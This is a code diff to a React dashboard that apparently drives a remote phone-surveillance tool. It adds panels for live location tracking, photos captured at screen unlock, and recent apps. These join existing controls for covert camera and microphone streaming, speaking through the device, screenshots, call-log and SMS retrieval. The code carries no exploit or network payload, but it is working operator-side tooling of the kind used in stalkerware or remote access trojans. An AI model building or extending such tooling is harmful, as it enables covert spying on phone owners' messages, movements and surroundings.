@@ -1,28 +1,40 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { useSocket } from '../hooks/useSocket'
 import DeviceList from '../components/DeviceList'
 import CameraPanel from '../components/CameraPanel'
-import ScreenPanel from '../components/ScreenPanel'
 import MicPanel from '../components/MicPanel'
 import SpeakPanel from '../components/SpeakPanel'
 import InfoPanel from '../components/InfoPanel'
 import CallLogsPanel from '../components/CallLogsPanel'
 import SMSPanel from '../components/SMSPanel'
+import LocationPanel from '../components/LocationPanel'
+import ScreenStatusPanel from '../components/ScreenStatusPanel'
+import RecentAppsPanel from '../components/RecentAppsPanel'
 
 export default function Dashboard({ token, onLogout }) {
   const [selected,       setSelected]       = useState(null)
   const [cameraOnFront,  setCameraOnFront]   = useState({})
   const [cameraOnBack,   setCameraOnBack]    = useState({})
-  const [screenOn,       setScreenOn]        = useState({})
+  const [locationOn,     setLocationOn]      = useState({})
   const [liveSpeakOn,    setLiveSpeakOn]     = useState({})
 
   const {
-    connected, devices, deviceNames, cameraFrames, screenFrames, micActive,
+    connected, devices, deviceNames, cameraFrames, cameraErrors, locationData,
+    screenStatus, unlockPhotos, recentApps, micActive,
     deviceInfos, batteries, callLogs, smsMessages, screenshots,
     cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
-    screenStart, screenStop, liveSpeakStart, liveSpeakStop,
-    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS, renameDevice,
+    liveSpeakStart, liveSpeakStop,
+    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS,
+    locationStart, locationStop, getRecentApps, renameDevice,
   } = useSocket(token)
+
+  // Reset camera button when hardware rejects it
+  useEffect(() => {
+    Object.entries(cameraErrors).forEach(([id, err]) => {
+      if (err.cameraType === 'front') setCameraOnFront(p => ({ ...p, [id]: false }))
+      if (err.cameraType === 'back')  setCameraOnBack(p => ({ ...p, [id]: false }))
+    })
+  }, [cameraErrors])
 
   function handleToggleFront(id) {
     if (cameraOnFront[id]) { cameraStopFront(id); setCameraOnFront(p => ({ ...p, [id]: false })) }
@@ -31,10 +43,6 @@ export default function Dashboard({ token, onLogout }) {
   function handleToggleBack(id) {
     if (cameraOnBack[id]) { cameraStopBack(id); setCameraOnBack(p => ({ ...p, [id]: false })) }
     else { cameraStartBack(id); setCameraOnBack(p => ({ ...p, [id]: true })) }
-  }
-  function handleScreenToggle(id) {
-    if (screenOn[id]) { screenStop(id); setScreenOn(p => ({ ...p, [id]: false })) }
-    else { screenStart(id); setScreenOn(p => ({ ...p, [id]: true })) }
   }
   function handleLiveSpeakToggle(id) {
     if (liveSpeakOn[id]) {
@@ -45,6 +53,10 @@ export default function Dashboard({ token, onLogout }) {
   }
   function handleMicToggle(id) {
     if (micActive[id]) micOff(id); else micOn(id)
+  }
+  function handleLocationToggle(id) {
+    if (locationOn[id]) { locationStop(id); setLocationOn(p => ({ ...p, [id]: false })) }
+    else { locationStart(id); setLocationOn(p => ({ ...p, [id]: true })) }
   }
 
   const displayName = selected ? (deviceNames[selected] || selected) : null
@@ -91,13 +103,6 @@ export default function Dashboard({ token, onLogout }) {
                 lastScreenshot={screenshots[selected]}
               />
 
-              <ScreenPanel
-                frame={screenFrames[selected]}
-                isOn={!!screenOn[selected]}
-                onStart={() => handleScreenToggle(selected)}
-                onStop={() => handleScreenToggle(selected)}
-              />
-
               <InfoPanel info={deviceInfos[selected]} battery={batteries[selected]} />
 
               <MicPanel
@@ -110,6 +115,23 @@ export default function Dashboard({ token, onLogout }) {
                 liveSpeakActive={!!liveSpeakOn[selected]}
                 onLiveSpeakStart={() => handleLiveSpeakToggle(selected)}
                 onLiveSpeakStop={() => handleLiveSpeakToggle(selected)}
+              />
+
+              <LocationPanel
+                location={locationData[selected]}
+                isOn={!!locationOn[selected]}
+                onStart={() => handleLocationToggle(selected)}
+                onStop={() => handleLocationToggle(selected)}
+              />
+
+              <ScreenStatusPanel
+                screenStatus={screenStatus[selected]}
+                unlockPhotos={unlockPhotos[selected]}
+              />
+
+              <RecentAppsPanel
+                recentApps={recentApps[selected]}
+                onRefresh={() => getRecentApps(selected)}
               />
 
               <CallLogsPanel logs={callLogs[selected]} onRefresh={() => getCallLogs(selected)} />
